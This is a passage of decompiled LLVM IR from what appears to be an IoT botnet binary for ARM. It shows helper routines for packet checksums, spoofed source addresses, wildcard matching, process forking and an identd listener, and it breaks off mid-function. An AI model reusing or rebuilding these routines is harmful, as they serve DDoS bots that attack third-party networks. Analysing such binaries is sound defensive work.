  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_49b18.17 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_49b18.17 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_49b18.17, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_448fc.27, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_448fc.27 to i32)

; uselistorder directives
  uselistorder i32* @global_var_448fc.27, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 114228, i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 217196, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_36a88.33 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_826810 = icmp sgt i32 %arg2, 1
  br i1 %v8_826810, label %dec_label_pc_8234, label %dec_label_pc_826c

dec_label_pc_8234:                                ; preds = %entry, %dec_label_pc_8234
  %stack_var_-28.013 = phi i16* [ %v5_8250, %dec_label_pc_8234 ], [ %arg1, %entry ]
  %stack_var_-36.012 = phi i32 [ %v2_8240, %dec_label_pc_8234 ], [ 0, %entry ]
  %stack_var_-32.011 = phi i32 [ %v1_8258, %dec_label_pc_8234 ], [ %arg2, %entry ]
  %v4_8234 = ptrtoint i16* %stack_var_-28.013 to i32
  %v2_8238 = load i16, i16* %stack_var_-28.013, align 2
  %v3_8238 = zext i16 %v2_8238 to i32
  %v2_8240 = add i32 %v3_8238, %stack_var_-36.012
  %v1_824c = add i32 %v4_8234, 2
  %v5_8250 = inttoptr i32 %v1_824c to i16*
  %v1_8258 = add nsw i32 %stack_var_-32.011, -2
  %v8_8268 = icmp sgt i32 %v1_8258, 1
  br i1 %v8_8268, label %dec_label_pc_8234, label %dec_label_pc_8260.dec_label_pc_826c_crit_edge

dec_label_pc_8260.dec_label_pc_826c_crit_edge:    ; preds = %dec_label_pc_8234
  %v7_8264.le = icmp eq i32 %v1_8258, 1
  br i1 %v7_8264.le, label %dec_label_pc_8278, label %dec_label_pc_82a0

dec_label_pc_826c:                                ; preds = %entry
  %v7_82649 = icmp eq i32 %arg2, 1
  br i1 %v7_82649, label %dec_label_pc_8278, label %dec_label_pc_82a0

dec_label_pc_8278:                                ; preds = %dec_label_pc_8260.dec_label_pc_826c_crit_edge, %dec_label_pc_826c
  %stack_var_-28.0.lcssa29 = phi i16* [ %v5_8250, %dec_label_pc_8260.dec_label_pc_826c_crit_edge ], [ %arg1, %dec_label_pc_826c ]
  %stack_var_-36.0.lcssa28 = phi i32 [ %v2_8240, %dec_label_pc_8260.dec_label_pc_826c_crit_edge ], [ 0, %dec_label_pc_826c ]
  %v1_8288 = bitcast i16* %stack_var_-28.0.lcssa29 to i8*
  %v2_8288 = load i8, i8* %v1_8288, align 1
  %v3_8288 = zext i8 %v2_8288 to i32
  %v2_8298 = add i32 %v3_8288, %stack_var_-36.0.lcssa28
  br label %dec_label_pc_82a0

dec_label_pc_82a0:                                ; preds = %dec_label_pc_8260.dec_label_pc_826c_crit_edge, %dec_label_pc_826c, %dec_label_pc_8278
  %stack_var_-36.1 = phi i32 [ %v2_8298, %dec_label_pc_8278 ], [ 0, %dec_label_pc_826c ], [ %v2_8240, %dec_label_pc_8260.dec_label_pc_826c_crit_edge ]
  %v3_82a4 = sdiv i32 %stack_var_-36.1, 65536
  %v3_82b0 = urem i32 %stack_var_-36.1, 65536
  %v2_82b4 = add nsw i32 %v3_82a4, %v3_82b0
  %v3_82c0 = sdiv i32 %v2_82b4, 65536
  %v2_82c8 = add nsw i32 %v3_82c0, %v2_82b4
  %v1_82dc = urem i32 %v2_82c8, 65536
  %v3_82e4 = xor i32 %v1_82dc, 65535
  ret i32 %v3_82e4

; uselistorder directives
  uselistorder i32 %v2_82b4, { 1, 0 }
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v1_8258, { 0, 2, 1 }
  uselistorder i32 %v2_8240, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_82a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8278, { 1, 0 }
  uselistorder label %dec_label_pc_8234, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_8304 = load i32, i32* @r4, align 4
  %v6_8304 = load i32, i32* @fp, align 4
  store i32 33548, i32* %stack_var_-4, align 4
  %v2_8308 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8308, i32* @fp, align 4
  %v2_831c = load i8, i8* %arg1, align 1
  %v7_8328 = icmp eq i8 %v2_831c, 42
  br i1 %v7_8328, label %dec_label_pc_835c, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %entry
  %v7_8334 = icmp eq i8 %v2_831c, 63
  br i1 %v7_8334, label %dec_label_pc_83cc, label %dec_label_pc_833c

dec_label_pc_833c:                                ; preds = %dec_label_pc_8330
  %v2_8340 = icmp eq i8 %v2_831c, 0
  br i1 %v2_8340, label %dec_label_pc_834c, label %dec_label_pc_8424

dec_label_pc_834c:                                ; preds = %dec_label_pc_833c
  %v2_8350 = load i8, i8* %tmp, align 1
  %v3_8350 = zext i8 %v2_8350 to i32
  br label %dec_label_pc_8498

dec_label_pc_835c:                                ; preds = %entry
  %v1_8360 = add i32 %tmp8, 1
  %v3_836c = inttoptr i32 %v1_8360 to i8*
  %v4_836c = call i32 @strwildmatch(i8* %v3_836c, i32 %arg2)
  %v2_8374 = icmp eq i32 %v4_836c, 0
  br i1 %v2_8374, label %dec_label_pc_83b8, label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_835c
  %v2_8380 = load i8, i8* %tmp, align 1
  %v2_8384 = icmp eq i8 %v2_8380, 0
  br i1 %v2_8384, label %dec_label_pc_83c0, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_837c
  %v1_8390 = add i32 %arg2, 1
  %v4_839c = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8390)
  %v2_83a4 = icmp eq i32 %v4_839c, 0
  br i1 %v2_83a4, label %dec_label_pc_83b8, label %dec_label_pc_83c0

dec_label_pc_83b8:                                ; preds = %dec_label_pc_838c, %dec_label_pc_835c
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_837c, %dec_label_pc_838c, %dec_label_pc_83b8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_83b8 ], [ 1, %dec_label_pc_838c ], [ 1, %dec_label_pc_837c ]
  br label %dec_label_pc_8498

dec_label_pc_83cc:                                ; preds = %dec_label_pc_8330
  %v2_83d0 = load i8, i8* %tmp, align 1
  %v2_83d4 = icmp eq i8 %v2_83d0, 0
  br i1 %v2_83d4, label %dec_label_pc_8418, label %dec_label_pc_83dc

dec_label_pc_83dc:                                ; preds = %dec_label_pc_83cc
  %v1_83e0 = add i32 %tmp8, 1
  %v1_83e8 = add i32 %arg2, 1
  %v2_83f4 = inttoptr i32 %v1_83e0 to i8*
  %v3_83f4 = call i32 @strwildmatch(i8* %v2_83f4, i32 %v1_83e8)
  %v2_83fc = icmp ne i32 %v3_83f4, 0
  %. = zext i1 %v2_83fc to i32
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_83dc, %dec_label_pc_83cc
  %storemerge2 = phi i32 [ 1, %dec_label_pc_83cc ], [ %., %dec_label_pc_83dc ]
  br label %dec_label_pc_8498

dec_label_pc_8424:                                ; preds = %dec_label_pc_833c
  %v2_8428 = load i8, i8* %arg1, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  %v1_8430 = call i32 @__GI_toupper(i32 %v3_8428)
  store i32 %v1_8430, i32* @r4, align 4
  %v2_843c = load i8, i8* %tmp, align 1
  %v3_843c = zext i8 %v2_843c to i32
  %v1_8444 = call i32 @__GI_toupper(i32 %v3_843c)
  %v0_844c = load i32, i32* @r4, align 4
  %v9_844c = icmp eq i32 %v0_844c, %v1_8444
  br i1 %v9_844c, label %dec_label_pc_8454, label %dec_label_pc_8490

dec_label_pc_8454:                                ; preds = %dec_label_pc_8424
  %v1_8458 = add i32 %tmp8, 1
  %v1_8460 = add i32 %arg2, 1
  %v2_846c = inttoptr i32 %v1_8458 to i8*
  %v3_846c = call i32 @strwildmatch(i8* %v2_846c, i32 %v1_8460)
  %v2_8474 = icmp ne i32 %v3_846c, 0
  %.7 = zext i1 %v2_8474 to i32
  br label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8454, %dec_label_pc_8424
  %storemerge = phi i32 [ 1, %dec_label_pc_8424 ], [ %.7, %dec_label_pc_8454 ]
  br label %dec_label_pc_8498

dec_label_pc_8498:                                ; preds = %dec_label_pc_8418, %dec_label_pc_83c0, %dec_label_pc_834c, %dec_label_pc_8490
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_83c0 ], [ %storemerge2, %dec_label_pc_8418 ], [ %v3_8350, %dec_label_pc_834c ], [ %storemerge, %dec_label_pc_8490 ]
  store i32 %v3_8304, i32* @r4, align 4
  store i32 %v6_8304, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8498, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_83c0, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_84b0 = load i32, i32* @r2, align 4
  store i32 %v6_84b0, i32* %stack_var_-8, align 4
  %v3_84b4 = load i32, i32* @fp, align 4
  store i32 33980, i32* %stack_var_-16, align 4
  %v2_84b8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_84b8, i32* @fp, align 4
  %v4_84c8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_49b4c.35 to i32), i32* @r0, align 4
  %v4_84dc = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_49b4c.35 to i32), i32 %arg2, i32 %v4_84c8)
  %v3_84e4 = call i32 @strlen(i8* bitcast (i8** @global_var_49b4c.35 to i8*))
  %v4_84f8 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_49b4c.35 to i32), i32 %v3_84e4)
  store i32 %v3_84b4, i32* @fp, align 4
  ret i32 %v4_84f8

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_49b4c.35 to i32), { 1, 0, 2 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8518 = load i32, i32* @fp, align 4
  store i32 34080, i32* %stack_var_-4, align 4
  %v2_851c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_851c, i32* @fp, align 4
  %v2_852c = load i8, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  %v7_8530 = icmp eq i8 %v2_852c, 1
  br i1 %v7_8530, label %dec_label_pc_8538, label %dec_label_pc_855c

dec_label_pc_8538:                                ; preds = %entry
  %v2_853c = load i32, i32* @global_var_52598.39, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_854c = call i32 @Send(i32 %v2_853c, i32 ptrtoint ([30 x i8]* @global_var_36a90.41 to i32))
  br label %dec_label_pc_865c

dec_label_pc_855c:                                ; preds = %entry
  %v0_855c = call i32 @fork()
  %v2_856c = icmp eq i32 %v0_855c, 0
  br i1 %v2_856c, label %dec_label_pc_8574, label %dec_label_pc_8580

dec_label_pc_8574:                                ; preds = %dec_label_pc_855c
  br label %dec_label_pc_865c

dec_label_pc_8580:                                ; preds = %dec_label_pc_855c
  %v2_8584 = load i32, i32* @global_var_49b48.43, align 4
  %v1_8588 = add i32 %v2_8584, 1
  store i32 %v1_8588, i32* @global_var_49b48.43, align 4
  %tmp = mul i32 %v2_8584, 4
  %v3_85a0 = add i32 %tmp, 8
  %v1_85a8 = call i32 @malloc(i32 %v3_85a0)
  %v2_860412 = load i32, i32* @global_var_49b48.43, align 4
  %v9_861014 = icmp eq i32 %v2_860412, 1
  br i1 %v9_861014, label %dec_label_pc_8618, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_8580, %dec_label_pc_85c0
  %storemerge116 = phi i32 [ %v1_85f8, %dec_label_pc_85c0 ], [ 0, %dec_label_pc_8580 ]
  %v3_85c4 = mul i32 %storemerge116, 4
  %v2_85d0 = add i32 %v3_85c4, %v1_85a8
  %v2_85e4 = load i32, i32* @global_var_53718.45, align 4
  %v2_85e8 = add i32 %v2_85e4, %v3_85c4
  %v1_85ec = inttoptr i32 %v2_85e8 to i32*
  %v2_85ec = load i32, i32* %v1_85ec, align 4
  %v2_85f0 = inttoptr i32 %v2_85d0 to i32*
  store i32 %v2_85ec, i32* %v2_85f0, align 4
  %v1_85f8 = add i32 %storemerge116, 1
  %v2_8604 = load i32, i32* @global_var_49b48.43, align 4
  %v1_8608 = add i32 %v2_8604, -1
  %tmp25 = icmp ugt i32 %v1_8608, %v1_85f8
  br i1 %tmp25, label %dec_label_pc_85c0, label %dec_label_pc_8600.dec_label_pc_8618_crit_edge

dec_label_pc_8600.dec_label_pc_8618_crit_edge:    ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_8580, %dec_label_pc_8600.dec_label_pc_8618_crit_edge
  %v2_8604.lcssa = phi i32 [ %v2_8604, %dec_label_pc_8600.dec_label_pc_8618_crit_edge ], [ %v2_860412, %dec_label_pc_8580 ]
  %v1_861c = add i32 %v1_85a8, -4
  %v3_8628 = mul i32 %v2_8604.lcssa, 4
  %v2_862c = add i32 %v1_861c, %v3_8628
  %v2_8634 = inttoptr i32 %v2_862c to i32*
  store i32 %v0_855c, i32* %v2_8634, align 4
  %v2_863c = load i32, i32* @global_var_53718.45, align 4
  store i32 %v2_863c, i32* @r0, align 4
  %v0_8644 = call i32 @free()
  store i32 %v1_85a8, i32* @global_var_53718.45, align 4
  br label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8574, %dec_label_pc_8538, %dec_label_pc_8618
  %v3_865c = phi i32 [ 0, %dec_label_pc_8574 ], [ 1, %dec_label_pc_8538 ], [ %v0_855c, %dec_label_pc_8618 ]
  store i32 %v3_8518, i32* @fp, align 4
  ret i32 %v3_865c

; uselistorder directives
  uselistorder i32 %v3_85c4, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_860412, { 1, 0 }
  uselistorder i32 %v1_85a8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_865c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c0, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v2_8698 = load i8*, i8** @global_var_49b40.47, align 4
  %v3_8698 = ptrtoint i8* %v2_8698 to i32
  %v2_869c = icmp eq i8* %v2_8698, null
  br i1 %v2_869c, label %dec_label_pc_86a4, label %dec_label_pc_86b4

dec_label_pc_86a4:                                ; preds = %entry
  %v0_86a4 = call i32 @rand()
  br label %dec_label_pc_8720

dec_label_pc_86b4:                                ; preds = %entry
  %v2_86b8 = load i32, i32* @global_var_49b44.49, align 4
  %v7_86bc = icmp eq i32 %v2_86b8, 1
  br i1 %v7_86bc, label %dec_label_pc_86c4, label %dec_label_pc_86dc

dec_label_pc_86c4:                                ; preds = %dec_label_pc_86b4
  %v2_86d0 = call i32 @__GI_ntohl(i32 %v3_8698)
  br label %dec_label_pc_8720

dec_label_pc_86dc:                                ; preds = %dec_label_pc_86b4
  %v0_86dc = call i32 @rand()
  %v2_86ec = load i32, i32* @global_var_49b44.49, align 4
  %v3_86f8 = urem i32 %v0_86dc, %v2_86ec
  %v2_8708 = load i8*, i8** @global_var_49b40.47, align 4
  %v3_8708 = ptrtoint i8* %v2_8708 to i32
  %v2_870c = add i32 %v3_86f8, 1
  %v1_8710 = add i32 %v2_870c, %v3_8708
  %v1_8718 = call i32 @__GI_ntohl(i32 %v1_8710)
  br label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86c4, %dec_label_pc_86a4, %dec_label_pc_86dc
  %stack_var_-20.0 = phi i32 [ %v0_86a4, %dec_label_pc_86a4 ], [ %v2_86d0, %dec_label_pc_86c4 ], [ %v1_8718, %dec_label_pc_86dc ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 (i32)* @__GI_ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_8720, { 2, 0, 1 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_873c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_873c, i32* @ip, align 4
  %v1_8778 = add i32 %tmp, -1
  br label %dec_label_pc_8774

dec_label_pc_8754:                                ; preds = %dec_label_pc_8798, %dec_label_pc_8774
  %v3_8760 = call i32 @strlen(i8* %arg1)
  %v2_8768 = add i32 %v1_8778, %v3_8760
  %v3_8770 = inttoptr i32 %v2_8768 to i8*
  store i8 0, i8* %v3_8770, align 1
  br label %dec_label_pc_8774

dec_label_pc_8774:                                ; preds = %entry, %dec_label_pc_8754
  %v3_8780 = call i32 @strlen(i8* %arg1)
  %v2_8788 = add i32 %v1_8778, %v3_8780
  %v1_878c = inttoptr i32 %v2_8788 to i8*
  %v2_878c = load i8, i8* %v1_878c, align 1
  %v7_8790 = icmp eq i8 %v2_878c, 13
  br i1 %v7_8790, label %dec_label_pc_8754, label %dec_label_pc_8798

dec_label_pc_8798:                                ; preds = %dec_label_pc_8774
  %v3_87a4 = call i32 @strlen(i8* %arg1)
  %v2_87ac = add i32 %v1_8778, %v3_87a4
  %v1_87b0 = inttoptr i32 %v2_87ac to i8*
  %v2_87b0 = load i8, i8* %v1_87b0, align 1
  %v7_87b4 = icmp eq i8 %v2_87b0, 10
  br i1 %v7_87b4, label %dec_label_pc_8754, label %dec_label_pc_87bc

dec_label_pc_87bc:                                ; preds = %dec_label_pc_8798
  ret i32 %v3_87a4

; uselistorder directives
  uselistorder i32 %v1_8778, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8774, { 1, 0 }
}

define i32 @randstring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_87cc = load i32, i32* @fp, align 4
  store i32 34772, i32* %stack_var_-4, align 4
  %v2_87d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_87d0, i32* @fp, align 4
  %v2_87e0 = call i32 @__GI_time(i32* null)
  %v1_87ec = call i32 @srand(i32 %v2_87e0)
  %v1_8804 = add i32 %arg1, 1
  %v1_880c = call i32 @malloc(i32 %v1_8804)
  %v2_881c = icmp eq i32 %v1_880c, 0
  br i1 %v2_881c, label %dec_label_pc_88c0, label %dec_label_pc_8830

dec_label_pc_8830:                                ; preds = %entry
  %v5_889c22 = icmp sgt i32 %arg1, 0
  br i1 %v5_889c22, label %dec_label_pc_8844, label %dec_label_pc_88a0

dec_label_pc_8844:                                ; preds = %dec_label_pc_8830, %dec_label_pc_8844
  %storemerge323 = phi i32 [ %v1_8888, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8830 ]
  %v0_8844 = call i32 @rand()
  %v3_8854 = urem i32 %v0_8844, 62
  %v2_886c = add i32 %storemerge323, %v1_880c
  %v2_8878 = add i32 %v3_8854, ptrtoint ([63 x i8]* @global_var_36ab0.51 to i32)
  %v1_887c = inttoptr i32 %v2_8878 to i8*
  %v2_887c = load i8, i8* %v1_887c, align 1
  %v3_8880 = inttoptr i32 %v2_886c to i8*
  store i8 %v2_887c, i8* %v3_8880, align 1
  %v1_8888 = add nuw nsw i32 %storemerge323, 1
  %v5_889c = icmp slt i32 %v1_8888, %arg1
  br i1 %v5_889c, label %dec_label_pc_8844, label %dec_label_pc_88a0

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8844, %dec_label_pc_8830
  %v2_88ac = add i32 %v1_880c, %arg1
  %v3_88b4 = inttoptr i32 %v2_88ac to i8*
  store i8 0, i8* %v3_88b4, align 1
  br label %dec_label_pc_88c0

dec_label_pc_88c0:                                ; preds = %entry, %dec_label_pc_88a0
  %storemerge4 = phi i32 [ %v1_880c, %dec_label_pc_88a0 ], [ 0, %entry ]
  store i32 %v3_87cc, i32* @fp, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_8888, { 1, 0 }
  uselistorder i32 %v1_880c, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_88c0, { 1, 0 }
  uselistorder label %dec_label_pc_8844, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_88dc = load i32, i32* @fp, align 4
  store i32 %v3_88dc, i32* %stack_var_-16, align 4
  store i32 35044, i32* %stack_var_-4, align 4
  %v13_88dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_88e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e0, i32* @fp, align 4
  %v3_88f4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_8904 = icmp eq i32 %v3_88f4, -1
  br i1 %v7_8904, label %dec_label_pc_8c94, label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %entry
  store i32 2, i32* %stack_var_-60, align 4
  %v1_8918 = call i32 @__GI_htons(i32 113)
  %v2_8930 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8930, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_8940 = call i32 @__GI_memset()
  %v2_8944 = ptrtoint i32* %stack_var_-60 to i32
  %v4_8954 = call i32 @bind(i32 %v3_88f4, i32 %v2_8944, i32 16, i32 %v2_8944)
  %v7_895c = icmp eq i32 %v4_8954, -1
  br i1 %v7_895c, label %dec_label_pc_8c94, label %dec_label_pc_8964

dec_label_pc_8964:                                ; preds = %dec_label_pc_890c
  %v2_896c = call i32 @listen(i32 %v3_88f4, i32 1)
  %v7_8974 = icmp eq i32 %v2_896c, -1
  br i1 %v7_8974, label %dec_label_pc_8c94, label %dec_label_pc_897c

dec_label_pc_897c:                                ; preds = %dec_label_pc_8964
  %v0_897c = call i32 @fork()
  %v2_8984 = icmp eq i32 %v0_897c, 0
  br i1 %v2_8984, label %dec_label_pc_8c94, label %dec_label_pc_898c

dec_label_pc_898c:                                ; preds = %dec_label_pc_897c
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8994 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8998 = ptrtoint i32* %stack_var_-44 to i32
  %v5_89a4 = call i32 @accept(i32 %v3_88f4, i32 %v2_8994, i32 %v2_8998, i32 %v2_8994, i32 16)
  %v2_89b4 = add i32 %v5_89a4, 1
  %v3_89b4 = icmp eq i32 %v5_89a4, -1
  br i1 %v3_89b4, label %dec_label_pc_89bc, label %dec_label_pc_89c4.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_898c
  %v1_89c0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_89c4.preheader

dec_label_pc_89c4.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_898c
  %v2_89cc = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8a0c = udiv i32 %v5_89a4, 32
  %v3_8a20 = mul nuw nsw i32 %v3_8a0c, 4
  %v2_8a28 = add i32 %v3_8a20, %v13_88dc
  %v1_8a38 = urem i32 %v5_89a4, 32
  %v6_8a40 = shl i32 1, %v1_8a38
  %v2_8a90 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8adc = add i32 %v2_8a28, -1220
  %v1_8ae0 = inttoptr i32 %v2_8adc to i32*
  br label %dec_label_pc_89e0.lr.ph

dec_label_pc_89e0.lr.ph:                          ; preds = %dec_label_pc_8ac0, %dec_label_pc_89c4.preheader
  br label %dec_label_pc_89e0

dec_label_pc_89e0:                                ; preds = %dec_label_pc_89e0.lr.ph, %dec_label_pc_89e0
  %storemerge26 = phi i32 [ 0, %dec_label_pc_89e0.lr.ph ], [ %v1_89f4, %dec_label_pc_89e0 ]
  %v5_89ec = mul nuw nsw i32 %storemerge26, 4
  %v6_89ec = add i32 %v5_89ec, %v2_89cc
  %v7_89ec = inttoptr i32 %v6_89ec to i32*
  store i32 0, i32* %v7_89ec, align 4
  %v1_89f4 = add nuw nsw i32 %storemerge26, 1
  %tmp33 = icmp ult i32 %v1_89f4, 32
  br i1 %tmp33, label %dec_label_pc_89e0, label %dec_label_pc_8a08

dec_label_pc_8a08:                                ; preds = %dec_label_pc_89e0
  %v2_8a30 = load i32, i32* %v1_8ae0, align 4
  %v2_8a44 = or i32 %v2_8a30, %v6_8a40
  store i32 %v2_8a44, i32* %v1_8ae0, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8aa8 = call i32 @__libc_select(i32 %v2_89b4, i32 %v2_89cc, i32 0, i32 0, i32 %v2_8a90)
  %v1_8ab0 = icmp slt i32 %v5_8aa8, 0
  br i1 %v1_8ab0, label %dec_label_pc_8ab8, label %dec_label_pc_8ac0

dec_label_pc_8ab8:                                ; preds = %dec_label_pc_8a08
  %v1_8abc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8ac0

dec_label_pc_8ac0:                                ; preds = %dec_label_pc_8a08, %dec_label_pc_8ab8
  %v2_8ae0 = load i32, i32* %v1_8ae0, align 4
  %v6_8aec1 = lshr i32 %v2_8ae0, %v1_8a38
  %v1_8af4 = urem i32 %v6_8aec1, 2
  %v2_8af8 = icmp eq i32 %v1_8af4, 0
  br i1 %v2_8af8, label %dec_label_pc_89e0.lr.ph, label %dec_label_pc_8b04

dec_label_pc_8b04:                                ; preds = %dec_label_pc_8ac0
  %v2_8b0c = ptrtoint i32* %stack_var_-1100 to i32
